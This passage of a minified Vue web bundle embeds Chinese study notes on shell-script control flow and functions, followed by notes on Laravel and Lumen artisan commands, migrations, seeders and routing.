fi\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577175009088](./img/linux/java-linux/Linux-v10-02天-授课/1577175009088.png)\r\n\r\n**3、if else-if else 语句：**\r\n\r\n**主要用于判断，相当于java se中的if else-if else**\r\n\r\n```shell\r\nif condition1\r\nthen\r\n    command1\r\nelif condition2 \r\nthen \r\n    command2\r\nelse\r\n    commandN\r\nfi\r\n```\r\n\r\n以下实例判断两个变量是否相等\r\n\r\n我们继续使用上面的例子（test-shell.sh ）\r\n\r\n```shell\r\na=10\r\nb=20\r\nif [ $a == $b ]\r\nthen\r\n   echo "a 等于 b"\r\nelif [ $a -gt $b ]\r\nthen\r\n   echo "a 大于 b"\r\nelif [ $a -lt $b ]\r\nthen\r\n   echo "a 小于 b"\r\nelse\r\n   echo "没有符合的条件"\r\nfi\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577152946471](./img/linux/java-linux/Linux-v10-02天-授课/1577152946471.png)\r\n\r\n**4、for 循环**\r\n\r\n**主要用于循环，相当于java se中的for循环，我们还是采用之前的例子test-shell.sh**\r\n\r\nfor循环格式为\r\n\r\n```shell\r\nfor var in item1 item2 ... itemN\r\ndo\r\n    command1\r\n    command2\r\n    ...\r\n    commandN\r\ndone\r\n```\r\n\r\n顺序输出当前列表中的字母：\r\n\r\n```shell\r\nfor loop in A B C D E F G \r\ndo\r\n    echo "顺序输出字母为: $loop"\r\ndone\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577153230698](./img/linux/java-linux/Linux-v10-02天-授课/1577153230698.png)\r\n\r\n\r\n\r\n**5、while循环**\r\n\r\n主要用于循环，相当于java se中的while循环\r\n\r\nwhile循环用于不断执行一系列命令，也用于从输入文件中读取数据 \r\n\r\n语法格式为\r\n\r\n```\r\nwhile condition\r\ndo\r\n    command\r\ndone\r\n```\r\n\r\n以下是一个基本的while循环，测试条件是：如果int小于等于10，那么条件返回真。int从0开始，每次循环处理时，int加1。 \r\n\r\n还是采用之前的例子test-shell.sh\r\n\r\n```shell\r\n#!/bin/bash\r\nint=1\r\nwhile(( $int<=10 ))\r\ndo\r\n    echo "输出的值为："$int\r\n    let "int++"\r\ndone\r\n```\r\n\r\n执行效果如下图\r\n\r\n**![1577153468616](./img/linux/java-linux/Linux-v10-02天-授课/1577153468616.png)**\r\n\r\n**6、case ... esac语句**\r\n\r\n**主要用于分支条件选择，相当于java se中的switch case循环**\r\n\r\n**case ... esac** 与其他语言中的 switch ... case 语句类似，是一种多分枝选择结构，每个 case 分支用右圆括号开始，用两个分号 **;;** 表示 break，即执行结束，跳出整个 case ... esac 语句，esac（就是 case 反过来）作为结束标记。\r\n\r\n还是采用之前的例子test-shell.sh\r\n\r\ncase ... esac 语法格式如下：\r\n\r\n```shell\r\ncase 值 in\r\n模式1)\r\n    command1\r\n    command2\r\n    command3\r\n    ;;\r\n模式2）\r\n    command1\r\n    command2\r\n    command3\r\n    ;;\r\n*)\r\n    command1\r\n    command2\r\n    command3\r\n    ;;\r\nesac\r\n```\r\n\r\ncase 后为取值，值可以为变量或常数。\r\n\r\n值后为关键字 in，接下来是匹配的各种模式，每一模式最后必须以右括号结束，模式支持正则表达式。\r\n\r\n下面通过v的值进行case--esac\r\n\r\n```shell\r\nv="czbk"\r\n\r\ncase "$v" in\r\n   "czbk") echo "传智播客"\r\n   ;;\r\n   "baidu") echo "baidu 搜索"\r\n   ;;\r\n   "google") echo "google 搜索"\r\n   ;;\r\nesac\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577153795748](./img/linux/java-linux/Linux-v10-02天-授课/1577153795748.png)\r\n\r\n\r\n\r\n### 4.3.7 shell函数\r\n\r\n```\r\n我们将要学习的shell函数，我们可以理解成在Java SE阶段我们学习的方法，它和shell函数的作用是一样的。\r\n```\r\n\r\n函数语法如下：\r\n\r\n```shell\r\n[ function ] funname [()]\r\n\r\n{\r\n\r\n    action;\r\n\r\n    [return int;]\r\n\r\n}\r\n```\r\n\r\n> 注意：\r\n>\r\n> - 1、可以使用function fun() 定义函数，也可以直接fun() 定义,不带任何参数。\r\n> - 2、函数参数返回，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。 return后跟数值n(0-255\r\n\r\n下面我们将定义一个函数，并发生函数调用\r\n\r\n还是采用之前的例子test-shell.sh\r\n\r\n```shell\r\n#!/bin/bash\r\n\r\nczbk(){\r\n    echo "这是第一个函数!"\r\n}\r\necho "-----这里是函数开始执行-----"\r\nczbk\r\necho "-----这里是函数执行完毕-----"\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1577159360606](./img/linux/java-linux/Linux-v10-02天-授课/1577159360606.png)\r\n\r\n下面，我们定义一个带有return语句的函数：\r\n\r\n```shell\r\nfunction czbk(){\r\n    echo "对输入的两个数字进行相加运算..."\r\n    echo "输入第一个数字: "\r\n    read aNum\r\n    echo "输入第二个数字: "\r\n    read anotherNum\r\n    echo "两个数字分别为 $aNum 和 $anotherNum !"\r\n    return $(($aNum+$anotherNum))\r\n}\r\nczbk\r\necho "输入的两个数字之和为 $? !"\r\n```\r\n\r\n> 注意：\r\n>\r\n> 函数返回值在调用该函数后通过 $? 来获得。\r\n>\r\n> 注意：所有函数在使用前必须定义。这意味着必须将函数放在脚本开始部分，直至shell解释器首次发现它时，才可以使用。调用函数仅使用其函数名即可。\r\n\r\n### 4.3.8 总结\r\n\r\n在企业级开发过程中，我们（开发人员）学习Linux主要的目的就是在Linux系统中能够熟练的操作目录、文件，还有就是通过所学的命令系统化的编写sh文件，所以，在当前章节中，我们要熟练的编写shell脚本相关命令以及综合案例中的知识点。',hr={data:function(){return{MainComponent:vr}}},Sr=hr,yr=Object(c["a"])(Sr,gr,br,!1,null,"6442f8de",null),fr=yr.exports,_r={components:{m1:dr,m2:fr},data:function(){return{tab:"m1",tabs:[{label:"Linux-v10-01天",value:"m1"},{label:"Linux-v10-02天",value:"m2"}]}}},xr=_r,wr=Object(c["a"])(xr,ir,sr,!1,null,"2965940c",null),Er=wr.exports,Tr={mixins:[j["a"]],components:{m1:u,m2:S,m3:T,m4:I,m5:B,m6:$,m7:Z,m8:sn,m9:mn,m10:Sn,m13:Tn,m14:Ln,m15:Nn,m16:ar,m18:Er,m19:zn},data:function(){return{tab:"m1",tabs:[{label:"笔记",value:"m6"},{label:"linux-目录",value:"m13"},{label:"linux命令",value:"m1"},{label:"调度+进程",value:"m7"},{label:"YUM+LAMP",value:"m19"},{label:"黑马云计算",value:"m16"},{label:"linux-备忘",value:"m2"},{label:"shell-基础",value:"m3"},{label:"运维书籍",value:"m4"},{label:"Linux—前端",value:"m5"},{label:"Linux—java",value:"m18"},{label:"前端运维",value:"m8"},{label:"日常运维",value:"m9"},{label:"Nginx",value:"m14"},{label:"Nginx 配置",value:"m15"}]}}},kr=Tr,Cr=Object(c["a"])(kr,e,a,!1,null,"5c5c8208",null);r["default"]=Cr.exports},f0ba:function(n,r,t){},f4eb:function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},a=[],i=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},s=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("    数据库相关：\n填充器 seeder\n迁移文件 migration\n模型工厂 factory    Faker 类库 \n数据库配置\nhttps://laravelacademy.org/post/19520.html#toc_1\n两个官网文档\nhttps://laravelacademy.org/laravel-docs-5_8\nhttps://learnku.com/docs/lumen/5.7\n\nphp artisan  命令 \n对于 laravel 原生支持的指令 但是 lumen 不支持 安装这个依赖包 \nlumen-generator\nhttps://github.com/flipboxstudio/lumen-generator\n\n速查表\nhttps://learnku.com/docs/laravel-cheatsheet/5.8\n\n")])])}],o={},l=o,c=t("2877"),p=Object(c["a"])(l,i,s,!1,null,"38331fa6",null),u=p.exports,m=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},d=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("       laravel artisan命令\n       https://laravelacademy.org/laravel-docs-5_8\nhttps://learnku.com/docs/lumen/5.7\n流程： 创建model -m 生成数据库迁移文件migration\n配置数据库迁移文件 \n配置 数据库模拟文件 seeds\n\n\n添加加载依赖项\ncomposer require laravel/socialite\n自动生成引入文件\ncomposer dump-auto\n\nphp artisan make:controller TaskController\n// restful 风格\nphp artisan make:controller PostController --resource\nRoute::resource('tasks', 'TaskController')\n//隐式控制器\n// Route::controller('foods','FoodsController');\n// restful 风格\n// Route::resource('foods','FoodsController');\n\nphp artisan make:middleware LoginMiddleware\n数据库迁移\nphp artisan make:migration goods\nphp artisan migrate \nphp artisan migrate:refresh\n模拟数据 \nphp artisan make:seeder UsersTableSeeder\nphp artisan db:seed --class=UsersTableSeeder\nphp artisan db:seed\n迁移加上模拟数据\nphp artisan migrate --seed \nphp artisan migrate:refresh --seed\n\ndebugbar 安装\ncomposer require barryvdh/laravel-debugbar\n在 config/app.php 里面的providers添加\nBarryvdh\\Debugbar\\ServiceProvider::class\n\neloquent\norm 数据库操作模型  \nconfig/database.php\n$app->withEloquent();\nhttps://laravelacademy.org/post/19531.html\n\n创建数据库交互模型文件\nphp artisan make:model Model/Order\nphp artisan make:model Order -m  //自动建立一个对应数据库迁移文件\n模型限定规则\n模型对应的数据库表名规则：单复数关系 User=>Users  或者 Users=>Users   lay=>laies\n主键id  \n\nmodel文件非默认规则(打破潜规则)：对应更改：\npublic $table=\"user\"; \npublic $primaryKey =\"cid\";\npublic $timestamps =false;\n\n\n\n\n\n\n\n\n\n   ")])])}],g={},b=g,v=Object(c["a"])(b,m,d,!1,null,"d53ec848",null),h=v.exports,S=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},y=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("            laravel  seeder 填充器\n            参考页面\nhttps://laravelacademy.org/post/9694.html\n模拟数据 \nphp artisan make:seeder UsersTableSeeder\nphp artisan db:seed --class=UsersTableSeeder\nphp artisan db:seed 一次 运行填充所有\n\nseeder  文件 的 run  方法 内容 可以如下 生成数据\n\n第一种方法\nDB::table('users')->insert([\n        'name' => str_random(10),\n        'email' => str_random(10).'@gmail.com',\n        'password' => bcrypt('secret'),\n    ]);\n\n第二种\n        $arr=[];\n\n        for($i=0;$i<100;$i++){\n            $tmp=[];\n            $tmp['country']=str_random(20);\n            $tmp['name']=str_random(10);\n            $arr[]=$tmp;\n        }\n\n        DB::table('tests')->insert($arr);\n\n第三种\nfactory(\\App\\User::class, 5)->create();\n        ")]),t("pre",[n._v("            数据库操作\n\n            参考 \nhttps://laravelacademy.org/post/19520.html#toc_1\n增删改查\nhttps://laravelacademy.org/post/9697.html#toc_0\n\nhttps://laravelacademy.org/post/9698.html\n\n首先 config/database.php 或者 lumen  的 bootstarp/app.php 开启门面 开启 eloqument\n参考 \n\n$users = DB::connection('read')->select(...);\n$users = DB::table('users')->get();\n$name = '学院君';\n$users = DB::table('users')->where('name', $name)->get();\n$user = DB::table('users')->where('name', $name)->first();\n$user = DB::table('users')->select('id', 'name', 'email')->where('name', $name)->first();\n        ")])])}],f={},_=f,x=Object(c["a"])(_,S,y,!1,null,"7fbd6105",null),w=x.exports,E=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h4",[n._v("web.php")]),t("pre",[n._v("<?php\n\n/*\n|--------------------------------------------------------------------------\n| Web Routes\n|--------------------------------------------------------------------------\n|\n| Here is where you can register web routes for your application. These\n| routes are loaded by the RouteServiceProvider within a group which\n| contains the \"web\" middleware group. Now create something great!\n|\n*/\n\nRoute::get('/', function () {\n    return view('welcome');\n});\n\n// Route::get('/','WelcomeController@index');\n//这段代码的含义是将针对 / 路由的 GET 请求传递给 App\\Http\\Controllers\\WelcomeController 控制器的 index 方法进行处理。\n// Route::get('uesr/{id}',function($id){\n//     return '用户id: '.$id;\n// });\n// 为路由参数指定正则匹配规则：\n// Route::get('page/{id}', function ($id) {\n//     return '页面ID: ' . $id;\n// })->where('id', '[0-9]+');\n\n// Route::get('page/{name}', function ($name) {\n//     return '页面名称: ' . $name;\n// })->where('name', '[A-Za-z]+');\n\n// Route::get('page/{id}/{slug}', function ($id, $slug) {\n//     return $id . ':' . $slug;\n// })->where(['id' => '[0-9]+', 'slug' => '[A-Za-z]+']);\n\n//https://laravelacademy.org/post/9611.html\n// 路由命名\n// Route::get('user/{id?}', function ($id = 1) {\n//     return \"用户ID: \" . $id;\n// })->name('user.profile');\n\n\n  <a href=\""+n._s(n.url("/"))+'">\n <a href="'+n._s(n.route("user.profile",[!1]))+'">\n <a href="'+n._s(n.route("user.profile",[100]))+"\">\n\n// 输出：http://blog.test/user/100\n\nRoute::get('/task','TaskController@home');\nRoute::resource('post','PostController');\n// 可以通过 Artisan 命令 php artisan route:list 查看应用的所有路由：\n        ")])])},T=[],k={},C=k,j=Object(c["a"])(C,E,T,!1,null,"becc5444",null),M=j.exports,R=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},L=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h4",[n._v("\n          lumen 从零开始创建项目 step0 \n       ")]),t("pre",[n._v("           下载 PHP\n把PHP 添加到系统 环境变量\n下载 composer 添加环境变量\n\n\n\ncomposer global require \"laravel/lumen-installer\"\n\ncomposer create-project --prefer-dist laravel/lumen blog\n\n添加  lumen  laravel 到环境变量 \nC:\\Users\\Administrator\\AppData\\Roaming\\Composer\\vendor\\bin\n\n配置 PHP 支持 MySQL \n1. 在 本机 的 PHP.INI 文件 中设置 extension_dir  语言支持包的路径为绝对路径\n   比如 C:\\Program Files\\php-7.3.6-nts-Win32-VC15-x64\\ext\n2. extension=php_mysqli.dll  \n   extension=pdo_mysql\nextension=mysqli\n\n配置 mysql  用户授权\n在 mysql 的 my.ini 文件中\ndefault_authentication_plugin=mysql_native_password\n\nmysql -uroot -p\n \nuse mysql;\nALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '你的密码'\n\n       ")]),t("h4",[n._v("lumen 从零开始创建项目 step1")]),t("pre",[n._v("       速查表 https://learnku.com/docs/laravel-cheatsheet/5.8\n安装   支持laravel 命令 的依赖库\nlumen-generator\nhttps://github.com/flipboxstudio/lumen-generator\ncomposer require flipbox/lumen-generator\n$app->register(Flipbox\\LumenGenerator\\LumenGeneratorServiceProvider::class);\n\n生成应用安全密钥\nphp artisan key:generate\n\n自动生成引入文件\ncomposer dump-auto\n\n查看当前 支持命令 \nphp artisan\n\n生成  Eloquent 模型 并 同时生成 数据库迁移文件\nphp artisan make:model  Test --migration OR -m\n\n生成 seeder  数据库 模拟文件 \nphp artisan make:seeder  TestTableSeeder\n\n生成  模型工厂类 文件  // 如果不支持 需要自己手动创建\nphp  artisan make:factory  TestModelFactory \n\n编写相对应的 迁移文件 ，工厂文件，模拟文件 \n模拟文件内  调用用模型工厂  批量生成数据\nfactory(\\App\\User::class, 5)->create();\n\n根据数据表生成迁移文件\n // --database   指定数据库连接（下同）\n // --force      当处于生产环境时强制执行，不询问（下同）\n // --path       指定单独迁移文件地址\n // --pretend    把将要运行的 SQL 语句打印出来（下同）\n // --seed       Seed 任务是否需要被重新运行（下同）\nphp artisan migrate [--database[='....']] [--force] [--path[='....']] [--pretend] [--seed]\n// 创建迁移数据库表\nphp artisan migrate:install [--database[=\"...\"]]\n生成/重置所有数据表\nphp artisan migrate[:fresh]\n\n生成所有假数据\nphp artisan db:seed \n\n生成 控制器\nphp  artisan make:controller TestController  [--plain]\nphp artisan make:controller PostController --resource\nRoute::resource('tasks', 'TaskController')\n\n生成 中间件\nphp artisan make:middleware LoginMiddleware\n\n其他的 事件 队列 服务注册 邮件 监听 轮询 等等 根据 需要自己 添加\n均有相应 命令 查看速查表 artisan \n\n对于 多数项目必须的 命令 如下\n  make:controller     Create a new controller class\n  make:event          Create a new event class\n  make:job            Create a new job class\n  make:listener       Create a new event listener class\n  make:mail           Create a new email class\n  make:middleware     Create a new middleware class\n  make:migration      Create a new migration file\n  make:model          Create a new Eloquent model class\n  make:policy         Create a new policy class\n  make:provider       Create a new service provider class\n\nkey:generate      Set the application key\n\nmake:command      Create a new Artisan command\nmake:controller   Create a new controller class\nmake:event        Create a new event class\nmake:job          Create a new job class\nmake:listener     Create a new event listener class\nmake:mail         Create a new email class\nmake:middleware   Create a new middleware class\nmake:migration    Create a new migration file\nmake:model        Create a new Eloquent model class\nmake:policy       Create a new policy class\nmake:provider     Create a new service provider class\nmake:seeder       Create a new seeder class\nmake:test         Create a new test class\n\n\n    \n       ")]),t("h4",[n._v("\nlumen 从零开始创建项目 step2\n")]),t("pre",[t("code",[n._v("\n    建表 数据 填充 \n\nSchema::create('users', function (Blueprint $table) {\n            $table->bigIncrements('id');\n            $table->string(\"name\");\n            $table->integer('age');\n            $table->string('country');\n            $table->string(\"email\");\n            $table->text(\"description\");\n            $table->date(\"borntime\");\n            $table->timestamps();\n        });\n\n    Schema::create('cafes', function( Blueprint $table ){\n        $table->increments('id');\n        $table->string('name');\n        $table->text('address');\n        $table->string('city');\n        $table->string('state');\n        $table->string('zip');\n        $table->decimal('latitude', 11, 8);\n        $table->decimal('longitude', 11, 8);\n        $table->timestamps();\n    });\n\n'password' => bcrypt('vienblog'),\n\n        Schema::create('admin_users', function(Blueprint $table)\n        {\n            $table->increments('id')->comment('ID');\n            $table->string('username')->unique('users_username_unique')->comment('用户名');\n            $table->string('email')->unique('users_email_unique')->comment('邮件');\n            $table->string('mobile', 11)->nullable()->comment('手机号码');\n            $table->smallInteger('sex')->default(1)->comment('性别');\n            $table->string('password', 60)->comment('密码');\n            $table->string('remember_token', 100)->nullable()->comment('TOKEN');\n            $table->timestamps();\n        });\n    }\n\n\n$factory->define(App\\User::class, function (Faker\\Generator $faker) {\n    return [\n\n        'name' => $faker->name,\n        \"age\" => $faker ->age,\n        \"country\" => $faker ->country,\n        'email' => $faker->email,\n        'description' => $faker->realText($maxNbChars = 200, $indexSize = 1),\n        \"borntime\" => $faker->dateTime($max = 'now', $timezone = null),\n    ];\n});\n\n\n    public function run()\n    {\n        //\n        factory(\\App\\User::class, 100)->create();\n    }\n\n    public function run()\n    {\n        \\DB::table('admin_users')->delete();\n        \\DB::table('admin_users')->insert(array (\n            0 => \n                array (\n                    'id'                =>  1,\n                    'username'          =>  'admin',\n                    'email'             =>  'admin@admin.com',\n                    'mobile'            =>  '18888888888',\n                    'sex'               =>  1,\n                    'password'          =>  '$2y$10$0nZ2IJJQzkuwTUvmsxVCYOAFw09sGceAk5b9p.AQ.h7I0YEj975rO', //f123456\n                    'remember_token'    =>  '',\n                    'created_at'        =>  date('Y-m-d H:i:s',time()),\n                    'updated_at'        =>  date('Y-m-d H:i:s',time()),\n                ),\n            )\n        );\n    }\n}\n\n\n\n\n    public function up()\n    {\n        Schema::create('blog_articles', function (Blueprint $table) {\n            $table->increments('id');\n            $table->string('slug')->unique();\n            $table->string('title', 255)->default('')->comment('title');\n            $table->string('keywords')->default('')->comment('keywords');\n            $table->string('description', 255)->default('')->comment('description');\n            $table->longText('markdown')->nullable()->comment('markdown content');\n            $table->integer('user_id')->default(0)->comment('author id');\n            $table->integer('cate_id')->default(0)->comment('category id');\n            $table->integer('comment_count')->default(0)->comment('comment count');\n            $table->integer('read_count')->default(0)->comment('read count');\n            $table->tinyInteger('status')->default(1)->comment('status: 1-public;0-private');\n            $table->integer('sort')->default(0)->comment('sort');\n            $table->tinyInteger('is_top')->default(0)->comment('sticky to top');\n            $table->integer('updated_at');\n            $table->integer('created_at');\n            $table->integer('deleted_at')->nullable();\n            $table->index('title');\n            $table->index('cate_id');\n            $table->index('user_id');\n            $table->index('created_at');\n        });\n    }\n")]),n._v("\n")]),t("h4",[n._v("\nlumen 从零开始创建项目 step3\n")]),t("pre",[n._v("    "),t("code",[n._v("\n        资源类 给返回的数据变形封装， 取出自己需要的  \nhttps://laravelacademy.org/post/19536.html\n\nprotected $hidden = ['password'];\nprotected $visible = ['first_name', 'last_name'];\nreturn $user->makeVisible('attribute')->toArray();\nreturn $user->makeHidden('attribute')->toArray();\nreturn $user->append('is_admin')->toArray();\n\nreturn $user->setAppends(['is_admin'])->toArray();\nprotected $casts = [\n    'birthday' => 'date:Y-m-d',\n    'joined_at' => 'datetime:Y-m-d H:00',\n];\n\nphp artisan make:resource UserCollection\n\nuse App\\User;\nuse App\\Http\\Resources\\UserCollection;\n\nRoute::get('/users', function () {\n    return new UserCollection(User::paginate());\n});\n\n<?php\n\nnamespace App\\Http\\Resources;\n\nuse Illuminate\\Http\\Resources\\Json\\JsonResource;\n\nclass User extends JsonResource\n{\n    /**\n     * Transform the resource into an array.\n     *\n     * @param  \\Illuminate\\Http\\Request\n     * @return array\n     */\n    public function toArray($request)\n    {\n        return [\n            'id' => $this->id,\n        ];\n    }\n\n    /**\n     * Customize the outgoing response for the resource.\n     *\n     * @param  \\Illuminate\\Http\\Request\n     * @param  \\Illuminate\\Http\\Response\n     * @return void\n     */\n    public function withResponse($request, $response)\n    {\n        $response->header('X-Value', 'True');\n    }\n}\n    ")]),n._v("\n")]),t("h4",[n._v("\nlumen 从零开始创建项目 step4\n")]),t("pre",[n._v("   获取  get 请求参数 \n一种 是 路径里面的参数   \n/aaa/{id}   =====> $id\n\n另一种 \n/aaa/vvv?aa=33   =====> $route=$request->route(); $route[2]['url参数'];\n\npost  请求的 获取参数  和文档一样 \n$request->input();\n\n\n \n")])])}],O={},A=O,I=Object(c["a"])(A,R,L,!1,null,"c504bc72",null),D=I.exports,P=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},N=[],q={},H=q,B=Object(c["a"])(H,P,N,!1,null,"165d6ed2",null),F=B.exports,U=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},J=[],z={},W=z,$=Object(c["a"])(W,U,J,!1,null,"272d53da",null),G=$.exports,V=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Q=[],K={},X=K,Y=Object(c["a"])(X,V,Q,!1,null,"7b158558",null),Z=Y.exports,nn=t("1b62"),rn={mixins:[nn["a"]],components:{m1:u,m2:h,m3:w,m4:M,m5:D,m6:F,m7:G,m8:Z},data:function(){return{tab:"m1",tab_level:1,tabs:[{label:"g",value:"m1"},{label:"基本",value:"m2"},{label:"基本",value:"m3"},{label:"基本",value:"m4"},{label:"基本",value:"m5"},{label:"基本",value:"m6"},{label:"基本",value:"m7"},{label:"基本",value:"m8"}]}}},tn=rn,en=Object(c["a"])(tn,e,a,!1,null,"7f7d1ad5",null);r["default"]=en.exports},f5d2:function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},a=[],i=t("9523"),s=t.n(i),o=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},l=[],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"ff4455f4",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},b=[],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"259cfd6f",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},_=[],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"283458d7",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},C=[],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"037f7fd0",null),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},A=[],I={},D=I,P=Object(u["a"])(D,O,A,!1,null,"5767b14e",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},H=[],B={},F=B,U=Object(u["a"])(F,q,H,!1,null,"ab4fe2cc",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},W=[],$={},G=$,V=Object(u["a"])(G,z,W,!1,null,"ff38144a",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},X=[],Y={},Z=Y,nn=Object(u["a"])(Z,K,X,!1,null,"566fdd1c",null),rn=nn.exports,tn={components:{m1:d,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return s()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},en=tn,an=Object(u["a"])(en,e,a,!1,null,"30cd76de",null);r["default"]=an.exports},fa2e:function(n,r,t){}}]);